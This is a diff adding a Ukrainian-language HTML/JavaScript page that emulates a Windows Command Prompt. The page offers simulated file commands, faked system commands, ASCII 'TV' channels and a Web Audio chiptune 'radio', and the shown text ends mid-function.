@@ -1,0 +1,2284 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Command Prompt</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{background:#0c0c0c;font-family:'Consolas','Courier New',monospace;display:flex;flex-direction:column}
+/* TITLEBAR */
+.titlebar{height:28px;background:#000080;display:flex;align-items:center;padding:0 8px;gap:6px;flex-shrink:0;user-select:none}
+.title-icon{font-size:13px}
+.title-text{flex:1;font-size:11px;color:#fff;font-weight:bold;white-space:nowrap;overflow:hidden}
+.tbtn{width:16px;height:14px;background:#c0c0c0;border:none;font-size:9px;color:#000;cursor:pointer;border-top:1px solid #fff;border-left:1px solid #fff;border-right:1px solid #444;border-bottom:1px solid #444;font-weight:bold;flex-shrink:0}
+/* MENUBAR */
+.menubar{height:18px;background:#0c0c0c;border-bottom:1px solid #222;display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.mitem{font-size:11px;color:#c0c0c0;padding:0 6px;height:18px;display:flex;align-items:center;cursor:default;user-select:none}
+.mitem:hover{background:#000080;color:#fff}
+/* OUTPUT */
+.output-wrap{flex:1;overflow-y:auto;padding:4px 6px;-webkit-overflow-scrolling:touch}
+.output-wrap::-webkit-scrollbar{width:8px}
+.output-wrap::-webkit-scrollbar-track{background:#1a1a1a}
+.output-wrap::-webkit-scrollbar-thumb{background:#444}
+.line{min-height:1.1em;font-size:12px;line-height:1.4;white-space:pre-wrap;word-break:break-all;color:#c0c0c0}
+.err{color:#ff5555!important}.ok{color:#55ff55!important}.warn{color:#ffff55!important}.info{color:#55ffff!important}
+/* INPUT BAR - always at bottom, never inside scroll */
+.input-bar{flex-shrink:0;background:#111;border-top:1px solid #333;display:flex;align-items:center;padding:4px 6px;gap:6px}
+.prompt-label{color:#c0c0c0;font-size:12px;white-space:nowrap;flex-shrink:0}
+#ci{flex:1;background:transparent;border:none;outline:none;color:#c0c0c0;font-family:'Consolas','Courier New',monospace;font-size:12px;min-width:0;padding:4px 0}
+.send-btn{flex-shrink:0;background:#000080;border:1px solid #4444aa;color:#fff;font-size:12px;padding:4px 10px;cursor:pointer;border-radius:2px;font-family:inherit;white-space:nowrap}
+.send-btn:active{background:#0000aa}
+/* STATUSBAR */
+.statusbar{height:18px;background:#c0c0c0;flex-shrink:0;display:flex;align-items:center;padding:0 4px;border-top:1px solid #fff}
+.status-txt{font-size:10px;color:#000;border:1px solid;border-color:#444 #fff #fff #444;padding:0 4px;height:14px;display:flex;align-items:center}
+/* DPAD */
+#dpad{display:none;flex-shrink:0;background:#0a0a0a;border-top:2px solid #333;padding:8px 4px 6px;user-select:none}
+.dpad-grid{display:grid;grid-template-columns:repeat(3,52px);grid-template-rows:repeat(3,52px);gap:5px;margin:0 auto;width:fit-content}
+.dp{width:52px;height:52px;background:#1a1a2e;border:2px solid #2a2a4e;border-radius:10px;color:#55ff55;font-size:24px;display:flex;align-items:center;justify-content:center;cursor:pointer;-webkit-tap-highlight-color:transparent;touch-action:manipulation}
+.dp:active,.dp:focus{background:#000080;border-color:#4444cc;outline:none}
+.dp.center{background:#2a0000;border-color:#550000;color:#ff5555;font-size:11px;font-family:'Consolas',monospace;line-height:1.2;text-align:center}
+.dp.center:active{background:#440000}
+</style>
+</head>
+<body>
+<div class="titlebar">
+  <span class="title-icon">🖥</span>
+  <span class="title-text" id="tt">C:\Windows\System32\cmd.exe</span>
+  <button class="tbtn">_</button><button class="tbtn">□</button><button class="tbtn">x</button>
+</div>
+<div class="menubar">
+  <div class="mitem">Файл</div><div class="mitem">Правка</div>
+  <div class="mitem">Вигляд</div><div class="mitem">Довідка</div>
+</div>
+<div class="output-wrap" id="ow" onclick="document.getElementById('ci').focus()"></div>
+<!-- D-PAD для змійки/тетрісу -->
+<div id="dpad">
+  <div class="dpad-grid">
+    <div class="dp" style="visibility:hidden"></div>
+    <div class="dp" id="dp-up"   ontouchstart="dpad('up')"   onmousedown="dpad('up')">▲</div>
+    <div class="dp" style="visibility:hidden"></div>
+    <div class="dp" id="dp-left" ontouchstart="dpad('left')" onmousedown="dpad('left')">◀</div>
+    <div class="dp center"       ontouchstart="dpad('stop')" onmousedown="dpad('stop')">СТОП</div>
+    <div class="dp" id="dp-right"ontouchstart="dpad('right')"onmousedown="dpad('right')">▶</div>
+    <div class="dp" style="visibility:hidden"></div>
+    <div class="dp" id="dp-down" ontouchstart="dpad('down')" onmousedown="dpad('down')">▼</div>
+    <div class="dp" style="visibility:hidden"></div>
+  </div>
+</div>
+<div class="input-bar">
+  <span class="prompt-label" id="pr">C:\Users\User&gt;</span>
+  <input type="text" id="ci" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="введіть команду...">
+  <button class="send-btn" id="sb2" onclick="sendCmd()">▶ OK</button>
+</div>
+<div class="statusbar"><div class="status-txt" id="sp">Готово</div></div>
+
+<script>
+var cwd='C:\\Users\\User';
+var env={USERNAME:'User',COMPUTERNAME:'PC-USER',OS:'Windows_NT',WINDIR:'C:\\Windows',PATH:'C:\\Windows\\system32',SYSTEMROOT:'C:\\Windows',HOMEDRIVE:'C:',HOMEPATH:'\\Users\\User',APPDATA:'C:\\Users\\User\\AppData\\Roaming',NUMBER_OF_PROCESSORS:'8'};
+var hist=[],hidx=-1,curLine='',gameMode=null;
+var ow=document.getElementById('ow');
+var prEl=document.getElementById('pr');
+var ci=document.getElementById('ci');
+var C={};
+
+var FS={'C:':{type:'dir',ch:{
+  'Windows':{type:'dir',ch:{'System32':{type:'dir',ch:{'cmd.exe':{type:'file',size:290304,date:'01.01.2024 10:00'},'notepad.exe':{type:'file',size:226816,date:'01.01.2024 10:00'}}},'Temp':{type:'dir',ch:{}}}},
+  'Program Files':{type:'dir',ch:{'Google':{type:'dir',ch:{'Chrome':{type:'dir',ch:{}}}}}},
+  'Users':{type:'dir',ch:{'User':{type:'dir',ch:{
+    'Desktop':{type:'dir',ch:{}},
+    'Documents':{type:'dir',ch:{'readme.txt':{type:'file',size:512,date:'01.01.2024 09:00',content:'Ласкаво просимо!\nКоманди: допомога, тв, радіо, казино, змійка, тетріс'}}},
+    'Downloads':{type:'dir',ch:{}}
+  }}}}
+}}};
+
+function pp(p){p=(p||'').trim().replace(/\//g,'\\');if(!p)return cwd;if(/^[A-Za-z]:/.test(p))return p.replace(/\\+$/,'')||p.slice(0,2)+'\\';var b=cwd;if(p[0]==='\\')return cwd.slice(0,2)+p;p.split('\\').forEach(function(t){if(!t||t==='.')return;if(t==='..')b=b.replace(/\\[^\\]+$/,'')||b.slice(0,3);else b=b.replace(/\\$/,'')+'\\'+ t;});return b;}
+function gdc(p){var pts=pp(p).replace(/\\/g,'/').split('/').filter(Boolean),n=FS;for(var i=0;i<pts.length;i++){var k=Object.keys(n).find(function(x){return x.toLowerCase()===pts[i].toLowerCase();});if(!k)return null;n=n[k];if(n.type==='dir')n=n.ch||{};else return null;}return n;}
+function gpd(p){return gdc(pp(p).replace(/\\[^\\]+$/,'')||cwd);}
+function gbn(p){return pp(p).split('\\').pop();}
+function gfk(d,n){return d?Object.keys(d).find(function(k){return k.toLowerCase()===n.toLowerCase();}):null;}
+function rnd(n){return Math.floor(Math.random()*n);}
+function fd(d){return String(d.getDate()).padStart(2,'0')+'.'+String(d.getMonth()+1).padStart(2,'0')+'.'+d.getFullYear();}
+function ft(d){return String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0')+':'+String(d.getSeconds()).padStart(2,'0');}
+
+function pr2(t,cls){
+  String(t).split('\n').forEach(function(l){
+    var el=document.createElement('div');
+    el.className='line'+(cls?' '+cls:'');
+    el.textContent=l;
+    ow.appendChild(el);
+  });
+  ow.scrollTop=ow.scrollHeight;
+}
+function echocmd(cmd){var el=document.createElement('div');el.className='line';el.textContent=cwd+'>'+cmd;ow.appendChild(el);}
+function upPr(){prEl.textContent=cwd+'>';}
+function clrClass(cls){document.querySelectorAll('.'+cls).forEach(function(e){e.remove();});}
+
+// ===== КОМАНДИ =====
+C['допомога']=C['help']=function(){pr2(
+'══════════ CMD ЕМУЛЯТОР ══════════\n'+
+'ФАЙЛИ:\n'+
+'  дир            — список файлів\n'+
+'  цд <шлях>      — змінити папку\n'+
+'  мд <ім\'я>      — створити папку\n'+
+'  рд <ім\'я>      — видалити папку\n'+
+'  дел <файл>     — видалити файл\n'+
+'  коп <з> <в>    — копіювати\n'+
+'  тип <файл>     — вміст файлу\n'+
+'  рен <ст> <нов> — перейменувати\n'+
+'СИСТЕМА:\n'+
+'  вер             — версія Windows\n'+
+'  дата/час        — дата/час\n'+
+'  еко <текст>     — вивести текст\n'+
+'  сет             — змінні середов.\n'+
+'  хто             — поточний юзер\n'+
+'  пін <хост>      — пінгувати\n'+
+'  іпк             — IP конфіг\n'+
+'  таск            — список процесів\n'+
+'  схд             — перевірка диску\n'+
+'  вим /r /t 30   — перезапуск\n'+
+'  цис             — очистити екран\n'+
+'  вих             — вийти\n'+
+'РОЗВАГИ:\n'+
+'  тв              — 📺 Телевізор\n'+
+'  радіо           — 📻 Радіо\n'+
+'  казино          — 🎰 Казино\n'+
+'  змійка          — 🐍 Змійка\n'+
+'  тетріс          — 🧩 Тетріс\n'+
+'  матриця         — 💚 Matrix\n'+
+'  вгадай          — 🎯 Вгадай число\n'+
+'  кал 2+2         — 🔢 Калькулятор\n'+
+'  куб 3           — 🎲 Кубики\n'+
+'  монета          — 🪙 Монетка\n'+
+'  жарт            — 😄 Жарт\n'+
+'  аски <текст>    — ASCII арт\n'+
+'  стоп            — зупинити гру\n'+
+'══════════════════════════════════','info');};
+
+C['цис']=C['cls']=function(){ow.innerHTML='';};
+C['вер']=C['ver']=function(){pr2('\nMicrosoft Windows [Версія 10.0.19045.4170]\n(c) Microsoft Corporation. Всі права захищені.\n');};
+C['дата']=C['date']=function(){var n=new Date();pr2('Дата: '+['Нд','Пн','Вт','Ср','Чт','Пт','Сб'][n.getDay()]+' '+fd(n));};
+C['час']=C['time']=function(){pr2('Час: '+ft(new Date()));};
+C['еко']=C['echo']=function(a,raw){var r=raw.replace(/^(еко|echo)\s*/i,'');if(!r.trim()){pr2('ЕКО увімкнено.');return;}pr2(r);};
+C['цд']=C['cd']=C['chdir']=function(a){if(!a.length){pr2(cwd);return;}var np=pp(a.join(' '));var d=gdc(np);if(d===null)pr2('Шлях не знайдено.','err');else{cwd=np;upPr();document.getElementById('tt').textContent=cwd+' - cmd.exe';}};
+C['дир']=C['dir']=function(a){var path=pp(a.filter(function(x){return !x.startsWith('/');}).join(' ')||cwd);var dir=gdc(path);if(!dir){pr2('Файл не знайдено.','err');return;}var now=new Date();pr2(' Каталог: '+path+'\n');pr2(fd(now)+'  '+ft(now)+'  <ПАП>  .');pr2(fd(now)+'  '+ft(now)+'  <ПАП>  ..');var fc=0,dc=2,ts=0;Object.entries(dir).forEach(function(e){var nm=e[0],nd=e[1];var dt=nd.date||fd(now)+' '+ft(now);if(nd.type==='dir'){pr2(dt+'  <ПАП>  '+nm);dc++;}else{pr2(dt+'  '+String(nd.size||0).padStart(12)+' '+nm);fc++;ts+=nd.size||0;}});pr2('  '+fc+' файл(ів) '+ts.toLocaleString()+' байт  │  '+dc+' папок');};
+C['мд']=C['md']=C['mkdir']=function(a){if(!a.length){pr2('Неправильний синтаксис.','err');return;}var t=pp(a.join(' ')),par=gdc(t.replace(/\\[^\\]+$/,'')||cwd);if(!par){pr2('Шлях не знайдено.','err');return;}var nm=t.split('\\').pop();if(gfk(par,nm)){pr2('Вже існує.','err');return;}par[nm]={type:'dir',ch:{}};pr2('Папку створено.','ok');};
+C['рд']=C['rd']=C['rmdir']=function(a){var f=a.filter(function(x){return x.startsWith('/');}),p=a.filter(function(x){return !x.startsWith('/');});if(!p.length){pr2('Неправильний синтаксис.','err');return;}var t=pp(p.join(' ')),d=gdc(t);if(!d){pr2('Не знайдено.','err');return;}if(Object.keys(d).length>0&&!f.some(function(x){return x.toUpperCase()==='/S';})){pr2('Каталог не порожній.','err');return;}var par=gpd(t),k=gfk(par,gbn(t));if(par&&k)delete par[k];pr2('Видалено.','ok');};
+C['дел']=C['del']=C['erase']=function(a){if(!a.length){pr2('Неправильний синтаксис.','err');return;}var t=pp(a.filter(function(x){return !x.startsWith('/');}).join(' ')),par=gpd(t),k=gfk(par,gbn(t));if(!k||!par||par[k]&&par[k].type==='dir'){pr2('Не знайдено.','err');return;}delete par[k];pr2('Видалено.','ok');};
+C['коп']=C['copy']=function(a){var p=a.filter(function(x){return !x.startsWith('/');});if(p.length<2){pr2('Неправильний синтаксис.','err');return;}var sp=gpd(pp(p[0])),sk=gfk(sp,gbn(p[0]));if(!sk||!sp||sp[sk].type==='dir'){pr2('Файл не знайдено.','err');return;}var dp=gdc(pp(p[1]).replace(/\\[^\\]+$/,'')||cwd);if(!dp){pr2('Шлях не знайдено.','err');return;}dp[pp(p[1]).split('\\').pop()]=Object.assign({},sp[sk]);pr2('1 файл скопійовано.','ok');};
+C['рен']=C['ren']=C['rename']=function(a){if(a.length<2){pr2('Неправильний синтаксис.','err');return;}var par=gpd(pp(a[0])),k=gfk(par,gbn(a[0]));if(!k||!par){pr2('Не знайдено.','err');return;}par[a[1]]=par[k];delete par[k];pr2('Перейменовано.','ok');};
+C['тип']=C['type']=function(a){if(!a.length){pr2('Неправильний синтаксис.','err');return;}var par=gpd(pp(a.join(' '))),k=gfk(par,gbn(a.join(' '))),nd=k?par[k]:null;if(!nd||nd.type==='dir'){pr2('Файл не знайдено.','err');return;}pr2(nd.content||'(порожній файл)');};
+C['сет']=C['set']=function(a,raw){var r=raw.replace(/^(сет|set)\s*/i,'').trim();if(!r){for(var k in env)pr2(k+'='+env[k]);return;}if(r.indexOf('=')!==-1){var i=r.indexOf('='),key=r.slice(0,i).toUpperCase(),val=r.slice(i+1);if(val)env[key]=val;else delete env[key];}else{var rl=r.toLowerCase(),f=false;for(var k in env){if(k.toLowerCase().startsWith(rl)){pr2(k+'='+env[k]);f=true;}}if(!f)pr2('Змінна не визначена.','err');}};
+C['хто']=C['whoami']=function(){pr2(env.COMPUTERNAME+'\\'+env.USERNAME);};
+C['хост']=C['hostname']=function(){pr2(env.COMPUTERNAME||'PC-USER');};
+C['сіс']=C['systeminfo']=function(){var n=new Date();pr2('\nОС: Microsoft Windows 10 Pro\nВласник: '+(env.USERNAME||'User')+'\nЧасовий пояс: (UTC+02:00) Київ\nОЗП: 16 384 МБ / 8 192 МБ вільно\nДата завантаження: '+fd(n)+'\n');};
+C['іпк']=C['ipconfig']=function(a){pr2('\nIPv4: 192.168.1.100\nМаска: 255.255.255.0\nШлюз: 192.168.1.1\nDNS: 8.8.8.8 / 8.8.4.4\n');};
+C['пін']=C['ping']=function(a){var h=a[0]||'localhost',ip=h==='localhost'?'127.0.0.1':'93.184.216.34';pr2('\nПінгую '+h+' ['+ip+']:');for(var i=0;i<4;i++)pr2('Відповідь від '+ip+': час='+(rnd(20)+1)+'мс','ok');pr2('Втрачено: 0 (0%)\n');};
+C['таск']=C['tasklist']=function(){pr2('\nПроцес                   PID   Пам\'ять\n─────────────────────────────────────');[['System','4','136 КБ'],['svchost.exe','856','32 768 КБ'],['explorer.exe','2048','65 536 КБ'],['cmd.exe','4096','4 096 КБ'],['chrome.exe','5120','256 000 КБ']].forEach(function(t){pr2(t[0].padEnd(24)+' '+t[1].padStart(5)+' '+t[2]);});};
+C['зад']=C['taskkill']=function(a){pr2('Завершено процес.','ok');};
+C['нет']=C['netstat']=function(){pr2('\nТCP  192.168.1.100:52468  142.250.200.78:443  ВСТАНОВЛЕНО\nTCP  0.0.0.0:135          0.0.0.0:0          ПРОСЛУХ.\n');};
+C['схд']=C['chkdsk']=function(){pr2('\nПеревірка диску C:...','info');var p=0;var iv=setInterval(function(){p+=rnd(20)+10;if(p>=100){clearInterval(iv);pr2('Помилок не знайдено.','ok');pr2('Вільно: 761 409 536 КБ\n');return;}pr2(p+'%...','warn');},500);};
+C['сфс']=C['sfc']=function(a){if(!a.length){pr2('Використання: сфс /scannow');return;}pr2('\nСканування...','info');var s=['Етап 1/3...','Етап 2/3...','Етап 3/3...'],i=0;var iv=setInterval(function(){if(i<s.length){pr2(s[i],'warn');i++;}else{clearInterval(iv);pr2('Порушень не знайдено.','ok');}},800);};
+C['вим']=C['shutdown']=function(a){var r=a.indexOf('/r')!==-1;pr2((r?'Перезапуск':'Вимкнення')+' через 30с (симуляція)','warn');};
+C['вих']=C['exit']=function(){pr2('\nДо побачення!');setTimeout(function(){ow.innerHTML='';boot();},600);};
+C['пауза']=C['pause']=function(){pr2('Натисніть будь-яку клавішу...');};
+
+// ===== ТЕЛЕВІЗОР =====
+var tvCh=[
+  {name:'УТ-1 НОВИНИ',col:'#fff',fr:[
+    ['╔════════ BREAKING NEWS ═════════╗','║                                ║','║  Добрий вечір! Головне сьогодні:║','║  • Рада прийняла новий закон   ║','║  • Економіка зростає на 4.2%   ║','║  • Динамо перемогло 3:1        ║','║  • Погода: тепло, сонячно      ║','║                                ║','║  LIVE │ 21:00 │ УТ-ПЕРШИЙ      ║','╚════════════════════════════════╝'],
+    ['╔════════ РЕПОРТАЖ ═══════════════╗','║                                 ║','║  Кор: Ми у центрі міста, де    ║','║  сьогодні щорічний фестиваль.   ║','║  Тисячі людей вийшли на площу. ║','║  Мер виступив з промовою        ║','║  на відкритті церемонії.        ║','║                                 ║','║  LIVE │ 21:05 │ УТ-ПЕРШИЙ       ║','╚═════════════════════════════════╝'],
+  ]},
+  {name:'КІНО ТВ',col:'#ffff55',fr:[
+    ['╔══════════ КІНО КАНАЛ ══════════╗','║                                ║','║  ЗАРАЗ: "Останній Алгоритм"    ║','║                                ║','║  Хакер знаходить секретний     ║','║  код що керує усім світом...   ║','║  У гол.ролях: О.Смирнов        ║','║                                ║','║  ★★★★☆  HD │ 18+  │ Dolby    ║','╚════════════════════════════════╝'],
+    ['╔══════════ КІНО КАНАЛ ══════════╗','║                                ║','║  [Сцена: темна серверна]       ║','║                                ║','║  ОЛЕКС: "Знайшов пароль!"      ║','║  САШКО: "Маєш 30 секунд. ДАВ!"║','║  ОЛЕКС: *друкує шалено*        ║','║         ДОСТУП ДОЗВОЛЕНО       ║','║                                ║','║  *** ПІСЛЯ РЕКЛАМИ ***         ║','╚════════════════════════════════╝'],
+    ['╔══════════ КІНО КАНАЛ ══════════╗','║                                ║','║  [Сцена: дах хмарочосу, ніч]   ║','║                                ║','║  ОЛЕКС: "Систему звільнено."   ║','║  САШКО: "Чи варте воно того?"  ║','║  ОЛЕКС: *дивиться на горизонт* ║','║         "Завжди."              ║','║                                ║','║  *** КІНЕЦЬ │ ДАЛІ: Зоря ***   ║','╚════════════════════════════════╝'],
+  ]},
+  {name:'СПОРТ ТВ LIVE',col:'#55ff55',fr:[
+    ['╔══════════ СПОРТ LIVE ═══════════╗','║                                 ║','║  ФУТБОЛ: Прем\'єр-ліга України   ║','║                                 ║','║    ДИНАМО  3 — 2  ШАХТАР       ║','║                                 ║','║  73\'  Гол! Іваненко #9         ║','║  81\'  Жовта: Марченко          ║','║                                 ║','║  LIVE │ 90+3 │ HD               ║','╚═════════════════════════════════╝'],
+    ['╔══════════ СПОРТ LIVE ═══════════╗','║                                 ║','║  БАСКЕТБОЛ: Суперліга           ║','║                                 ║','║    КИЇВ 108 — 104 ХАРКІВ        ║','║                                 ║','║  Q4  2:34 залишилось            ║','║  Тайм-аут: ХАРКІВ               ║','║                                 ║','║  LIVE │ АРЕНА КАМ │ HD          ║','╚═════════════════════════════════╝'],
+    ['╔══════════ СПОРТ LIVE ═══════════╗','║                                 ║','║  ФОРМУЛА 1: Нічна гонка         ║','║                                 ║','║  1. Хемілтон    КОЛ 42/58      ║','║  2. Ферстаппен  +1.2с           ║','║  3. Леклер      +3.8с           ║','║  4. Норріс      +7.1с           ║','║                                 ║','║  LIVE │ ПІТ-ЛЕЙ│ HD            ║','╚═════════════════════════════════╝'],
+  ]},
+  {name:'МУЗИКА ТВ',col:'#ff55ff',fr:[
+    ['╔══════════ МУЗИКА ТВ ═══════════╗','║  ♪♫♪♬♫♪♬♪♫♪♬♫♪♬♪♫♪♬♫♪♬♪♫♪♬   ║','║                                ║','║  ЗАРАЗ: Океан Ельзи            ║','║  Пісня: "Мій герой"            ║','║                                ║','║  ░░░░░░░▓▓▓▓░░  2:47/4:12     ║','║  [VOL ████████░] СТЕРЕО        ║','║                                ║','║  ДАЛІ: Бумбокс — Вночі        ║','╚════════════════════════════════╝'],
+    ['╔══════════ МУЗИКА ТВ ═══════════╗','║  ТОП-7 ЦЬОГО ТИЖНЯ:            ║','║                                ║','║  1. Океан Ельзи — Мій герой   ║','║  2. Бумбокс — Вночі            ║','║  3. Скрябін — Я так хочу       ║','║  4. Антитіла — Вдома           ║','║  5. MONATIK — Кружит           ║','║  6. Тіна Кароль — Я буду       ║','║  7. The Hardkiss — Журавлі     ║','╚════════════════════════════════╝'],
+  ]},
+  {name:'ПРИРОДА ТВ',col:'#55ffff',fr:[
+    ['╔═══════ ПРИРОДА І ВІДКРИТТЯ ════╗','║                                ║','║  "Таємниці глибокого океану"   ║','║                                ║','║  На глибині 3000м живуть       ║','║  істоти невидимі людству.      ║','║  Риба-вудильник полює за       ║','║  допомогою біолюмінесценції.   ║','║                                ║','║  HD │ Dolby 5.1 │ 4K UHD       ║','╚════════════════════════════════╝'],
+    ['╔═══════ ПРИРОДА І ВІДКРИТТЯ ════╗','║                                ║','║  "Амазонські джунглі"          ║','║                                ║','║  🌿 ДЕРЕВА  🦜 ПТАХИ  🌧 ДОЩ  ║','║                                ║','║  10% усіх видів Землі.         ║','║  Щодня — нові відкриття.       ║','║  Ліс — легені планети.         ║','║  HD │ Dolby 5.1 │ 4K UHD       ║','╚════════════════════════════════╝'],
+  ]},
+  {name:'НЕМАЄ СИГНАЛУ',col:'#888',fr:null},
+];
+var tvSt={ch:0,fr:0,iv:null};
+
+C['тв']=C['tv']=function(a){
+  if(a[0]==='вимк'||a[0]==='off'){C['стоп']();return;}
+  pr2('📺 ТВ увімкнено! + / - для каналів, "стоп" щоб вимкнути','ok');
+  gameMode='tv';tvSt={ch:0,fr:0};renderTV();
+  tvSt.iv=setInterval(function(){if(gameMode!=='tv'){clearInterval(tvSt.iv);return;}tvSt.fr++;renderTV();},2800);
+};
+
+function renderTV(){
+  clrClass('tv-row');
+  var ch=tvCh[tvSt.ch];
+  function addTV(t,c){var el=document.createElement('div');el.className='line tv-row';el.style.color=c||ch.col;el.textContent='  '+t;ow.appendChild(el);}
+  if(!ch.fr){
+    var nc=' .,:;!?+*#@░▒▓';
+    for(var r=0;r<10;r++){var n='';for(var c2=0;c2<34;c2++)n+=nc[rnd(nc.length)];addTV(n,'#'+rnd(9)+'888');}
+    addTV('📡 НЕМАЄ СИГНАЛУ — КАН.'+(tvSt.ch+1),'#ff5555');
+  }else{
+    var lines=ch.fr[tvSt.fr%ch.fr.length];
+    var glitch=Math.random()<0.07;
+    lines.forEach(function(l,ri){if(glitch&&ri===rnd(lines.length))l=l.slice(3)+l.slice(0,3);addTV(l);});
+  }
+  addTV('─────────────────────────────────────','#444');
+  addTV('📺 КАН.'+(tvSt.ch+1)+' │ '+ch.name,'#ffff00');
+  addTV('[+] наст  [-] попер  [1-6] вибір  стоп=вимкнути','#555');
+  ow.scrollTop=ow.scrollHeight;
+}
+
+// ===== РАДІО =====
+var radioSt=[
+  {name:'Радіо Ера FM  96.0',songs:['Океан Ельзи — Мій герой','Бумбокс — Вночі','Скрябін — Я так хочу','Антитіла — Вдома','MONATIK — Кружит'],sig:100,type:'music'},
+  {name:'Хіт FM        98.3',songs:['Imagine Dragons — Believer','The Weeknd — Blinding Lights','Dua Lipa — Levitating','Ed Sheeran — Shape of You'],sig:95,type:'music'},
+  {name:'Радіо Рокс   100.5',songs:['AC/DC — Thunderstruck','Metallica — Enter Sandman','Queen — Bohemian Rhapsody','Nirvana — Teen Spirit'],sig:88,type:'music'},
+  {name:'Класик Радіо 103.4',songs:['Бетховен — Місячна соната','Моцарт — Симфонія №40','Шопен — Ноктюрн Op.9 №2','Вівальді — Весна'],sig:92,type:'music'},
+  {name:'Шансон Плюс  107.7',songs:['Розово небо','Мурка','Владимирский централ','Одесса-мама'],sig:75,type:'music'},
+  {name:'УР-1 НОВИНИ  105.0',songs:['Читаємо новини...'],sig:98,type:'news'},
+];
+var rSt={st:0,song:0,pos:0,iv:null};
+var EQ='▁▂▃▄▅▆▇█';
+
+// ===== WEB AUDIO ENGINE =====
+var audioCtx=null,audioNodes=[],audioLoopId=null,audioNoteIdx=0,audioBeatTimer=null;
+
+// Мелодії для кожної станції (нотна послідовність: [частота, тривалість_мс, тип_хвилі])
+var STATION_MUSIC=[
+  // 0: Ера FM — pop чіп мелодія (C-E-G-A-G-E-C ...)
+  {bpm:128,wave:'square',melody:[
+    [523,200],[659,200],[784,200],[880,200],[784,200],[659,200],
+    [523,400],[0,200],[659,200],[784,200],[880,200],[1047,400],
+    [880,200],[784,200],[659,200],[523,400],[0,400],
+  ]},
+  // 1: Хіт FM — pop synth (яскрава)
+  {bpm:120,wave:'sawtooth',melody:[
+    [440,150],[494,150],[523,150],[587,300],[523,150],[494,150],
+    [440,300],[0,150],[392,150],[440,150],[494,150],[523,300],
+    [587,150],[659,150],[698,150],[784,600],[0,300],
+  ]},
+  // 2: Рокс — важкий рок риф (distorted square)
+  {bpm:140,wave:'square',melody:[
+    [110,100],[110,100],[0,50],[110,100],[0,50],[147,100],[0,50],[131,200],
+    [110,100],[110,100],[0,50],[110,100],[0,50],[165,100],[0,50],[147,300],
+    [0,100],[98,100],[0,50],[98,100],[0,50],[110,100],[0,50],[123,200],
+    [110,100],[110,100],[0,50],[131,100],[0,50],[110,200],[0,200],
+  ]},
+  // 3: Класик — Місячна соната (Бетховен, спрощено)
+  {bpm:60,wave:'sine',melody:[
+    [330,400],[392,400],[494,400],[330,400],[392,400],[494,400],
+    [311,400],[392,400],[466,400],[311,400],[392,400],[466,400],
+    [294,400],[370,400],[440,400],[294,400],[370,400],[440,400],
+    [277,400],[349,400],[415,400],[277,400],[349,400],[415,400],
+  ]},
+  // 4: Шансон — повільна мінорна балада
+  {bpm:70,wave:'triangle',melody:[
+    [220,500],[247,500],[262,500],[294,500],[262,500],[247,500],
+    [220,800],[0,300],[196,500],[220,500],[247,500],[220,800],
+    [0,300],[175,500],[196,500],[220,500],[247,500],[262,500],
+    [220,1000],[0,500],
+  ]},
+  // 5: Новини УР-1 — урочиста заставка новин
+  {bpm:100,wave:'sine',melody:[
+    [523,150],[659,150],[784,300],[0,100],
+    [523,150],[659,150],[784,150],[1047,500],[0,200],
+    [784,150],[698,150],[659,150],[587,300],[0,100],
+    [523,150],[587,150],[659,150],[784,600],[0,400],
+    [880,100],[784,100],[698,100],[659,200],[0,100],
+    [523,150],[659,150],[784,150],[1047,800],[0,600],
+  ]},
+];
+
+function initAudio(){
+  if(!audioCtx){
+    try{audioCtx=new(window.AudioContext||window.webkitAudioContext)();}
+    catch(e){audioCtx=null;}
+  }
+  return !!audioCtx;
+}
+
+function stopAudio(){
+  if(audioBeatTimer){clearTimeout(audioBeatTimer);audioBeatTimer=null;}
+  audioNodes.forEach(function(n){try{n.stop();}catch(e){}});
+  audioNodes=[];audioNoteIdx=0;
+}
+
+function playNote(freq,dur,wave,vol){
+  if(!audioCtx||freq<=0)return;
+  try{
+    var osc=audioCtx.createOscillator();
+    var gain=audioCtx.createGain();
+    var filter=audioCtx.createBiquadFilter();
+    filter.type='lowpass';filter.frequency.value=2000;
+    osc.type=wave||'square';
+    osc.frequency.value=freq;
+    gain.gain.setValueAtTime(vol||0.15,audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001,audioCtx.currentTime+dur/1000);
+    osc.connect(filter);filter.connect(gain);gain.connect(audioCtx.destination);
+    osc.start();osc.stop(audioCtx.currentTime+dur/1000+0.05);
+    audioNodes.push(osc);
+    // cleanup
+    setTimeout(function(){var i=audioNodes.indexOf(osc);if(i!==-1)audioNodes.splice(i,1);},dur+200);
+  }catch(e){}
+}
+
+function playNoiseStatic(){
+  if(!audioCtx)return;
+  try{
+    var buf=audioCtx.createBuffer(1,audioCtx.sampleRate*0.1,audioCtx.sampleRate);
+    var data=buf.getChannelData(0);
+    for(var i=0;i<data.length;i++)data[i]=(Math.random()*2-1)*0.05;
+    var src=audioCtx.createBufferSource();
+    src.buffer=buf;src.connect(audioCtx.destination);src.start();
+    audioNodes.push(src);
+    setTimeout(function(){var i=audioNodes.indexOf(src);if(i!==-1)audioNodes.splice(i,1);},200);
+  }catch(e){}
+}
+
+function scheduleNextNote(){
+  if(gameMode!=='radio')return;
+  var s=radioSt[rSt.st];
+  var m=STATION_MUSIC[rSt.st];
+  var hasNoise=s.sig<100&&Math.random()>(s.sig/100+0.4);
+  if(hasNoise){playNoiseStatic();audioBeatTimer=setTimeout(scheduleNextNote,150);return;}
+  var note=m.melody[audioNoteIdx%m.melody.length];
+  playNote(note[0],note[1],m.wave,0.12);
+  audioNoteIdx++;
+  audioBeatTimer=setTimeout(scheduleNextNote,note[1]+10);
+}
+
+function startRadioAudio(){
+  if(!initAudio())return;
+  stopAudio();audioNoteIdx=0;
+  if(audioCtx.state==='suspended')audioCtx.resume();
+  // news channel plays jingle then silence
+  if(rSt.st===5){
+    var jingle=STATION_MUSIC[5];
+    var idx=0;
+    function playJingle(){
+      if(idx>=jingle.melody.length||gameMode!=='radio'||rSt.st!==5)return;
+      var note=jingle.melody[idx];
+      playNote(note[0],note[1],jingle.wave,0.15);
+      idx++;
